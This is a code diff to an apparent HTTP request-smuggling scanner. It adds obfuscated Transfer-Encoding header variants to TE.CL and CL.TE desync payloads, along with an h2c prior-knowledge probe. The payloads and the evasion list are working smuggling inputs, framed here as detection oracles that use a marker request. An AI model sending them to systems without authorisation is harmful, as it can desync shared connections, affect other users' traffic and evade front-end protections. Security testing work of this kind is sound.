@@ -92,7 +92,8 @@ def read_response(sock, timeout: int = 10) -> tuple:
     return status, text
 
 
-def smuggle_prefix(mode: str, host: str, path: str, marker: str) -> str:
+def smuggle_prefix(mode: str, host: str, path: str, marker: str,
+                   variant: str = "plain") -> str:
     """The ambiguous request, framed for one front-end/back-end disagreement.
 
     TE.CL: the front end frames by chunked (sees the zero chunk and treats the
@@ -101,12 +102,18 @@ def smuggle_prefix(mode: str, host: str, path: str, marker: str) -> str:
 
     CL.TE: the front end frames by Content-Length and forwards the chunked
     tail; the back end re-parses the tail as a request start.
+
+    `variant` replaces the `Transfer-Encoding: chunked` line with an
+    obfuscated form. The framing disagreement is unchanged — only the header
+    each parser accepts as "chunked" differs, which is the whole point:
+    front end and back end disagree about whether the body is chunked at all.
     """
+    te_block = _te_block(variant)
     if mode == "te_cl":
         return (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
                 "Content-Type: application/x-www-form-urlencoded\r\n"
                 "Content-Length: 6\r\n"
-                "Transfer-Encoding: chunked\r\n"
+                f"{te_block}"
                 "Connection: keep-alive\r\n\r\n"
                 "0\r\n\r\n"
                 f"GPOST /{marker} HTTP/1.1\r\nHost: {host}\r\n"
@@ -115,7 +122,7 @@ def smuggle_prefix(mode: str, host: str, path: str, marker: str) -> str:
     return (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
             "Content-Type: application/x-www-form-urlencoded\r\n"
             "Content-Length: 4\r\n"
-            "Transfer-Encoding: chunked\r\n"
+            f"{te_block}"
             "Connection: keep-alive\r\n\r\n"
             "5c\r\n"
             f"GPOST /{marker} HTTP/1.1\r\n"
@@ -123,6 +130,47 @@ def smuggle_prefix(mode: str, host: str, path: str, marker: str) -> str:
             "Content-Length: 15\r\n\r\n"
             "x=1\r\n"
             "0\r\n\r\n")
+
+
+# Every entry keeps the *duplicate framing* (Content-Length + a header the
+# other parser will read as chunked). The variants differ only in how the
+# Transfer-Encoding line is spelled, which is what makes one hop treat the
+# body as chunked and the other as at-EOF.
+TE_OBFUSCATIONS = {
+    "plain": ("Transfer-Encoding: chunked",),
+    "xchunked": ("Transfer-Encoding: xchunked",),
+    "space_before_colon": ("Transfer-Encoding : chunked",),
+    "tab": ("Transfer-Encoding:\tchunked",),
+    "trailing_space": ("Transfer-Encoding: chunked ",),
+    "case": ("Transfer-Encoding: Chunked",),
+    "dup_chunked_identity": ("Transfer-Encoding: chunked",
+                             "Transfer-Encoding: identity"),
+    "dup_identity_chunked": ("Transfer-Encoding: identity",
+                             "Transfer-Encoding: chunked"),
+    "dup_x_chunked": ("Transfer-Encoding: x",
+                      "Transfer-Encoding: chunked"),
+}
+
+# Ordered fallback set: cheapest and most common first. `plain` is the
+# historical byte sequence and must stay first (tests pin it).
+DEFAULT_TE_VARIANTS = ("plain", "xchunked", "space_before_colon",
+                       "dup_chunked_identity", "dup_identity_chunked",
+                       "dup_x_chunked", "tab", "trailing_space", "case")
+
+
+def _te_block(variant: str) -> str:
+    lines = TE_OBFUSCATIONS.get(str(variant or "plain"), ())
+    if not lines:
+        lines = TE_OBFUSCATIONS["plain"]
+    return "".join(f"{line}\r\n" for line in lines)
+
+
+def variants(limit: int = 0) -> list:
+    """The TE obfuscation fallback order, optionally capped."""
+    order = list(DEFAULT_TE_VARIANTS)
+    if limit and limit > 0:
+        order = order[:limit]
+    return order
 
 
 def is_ambiguous(server_status: int) -> tuple:
@@ -168,12 +216,56 @@ async def probe_ambiguity(url: str, timeout: int = 12) -> tuple:
     return await asyncio.to_thread(probe)
 
 
+async def h2c_supported(url: str, timeout: int = 10) -> tuple:
+    """Does the endpoint speak HTTP/2 prior-knowledge on cleartext?
+
+    This is an observation, not a vulnerability: h2c is normal inside a mesh.
+    It matters because the H2 desync oracles need an HTTP/2 peer, and a
+    plaintext target has no ALPN to negotiate with. A SETTINGS frame in reply
+    to the connection preface means those oracles now apply.
+    """
+    if (urlparse(url).scheme or "http").lower() != "http":
+        return False, "not_cleartext"
+
+    def probe() -> tuple:
+        try:
+            sock, _host = connection(url, timeout=timeout)
+        except OSError as exc:
+            return False, f"connect failed: {exc}"
+        try:
+            sock.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
+                         b"\x00\x00\x00\x04\x00\x00\x00\x00\x00")
+            header = b""
+            while len(header) < 9:
+                chunk = sock.recv(9 - len(header))
+                if not chunk:
+                    break
+                header += chunk
+        except OSError as exc:
+            return False, f"probe failed: {exc}"
+        finally:
+            try:
+                sock.close()
+            except OSError:
+                pass
+        if len(header) < 9:
+            return False, "no frame header"
+        length = int.from_bytes(header[:3], "big")
+        frame_type = header[3]
+        if frame_type == 0x04 and length <= 16384:
+            return True, "h2c SETTINGS frame"
+        return False, f"unexpected frame type {frame_type}"
+
+    return await asyncio.to_thread(probe)
+
+
 async def desync_probe(
     url: str,
     mode: str = "cl_te",
     timeout: int = 60,
     connect: Optional[Callable] = None,
     read: Optional[Callable] = None,
+    variant: str = "plain",
 ) -> tuple:
     """One desync oracle against one endpoint, for one framing disagreement.
 
@@ -192,7 +284,7 @@ async def desync_probe(
             return False, f"connect failed: {exc}"
         try:
             path = urlparse(url).path or "/"
-            prefix = smuggle_prefix(mode, host, path, marker)
+            prefix = smuggle_prefix(mode, host, path, marker, variant)
             normal = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                       "Connection: close\r\n\r\n")
             sock.sendall(prefix.encode() + normal.encode())
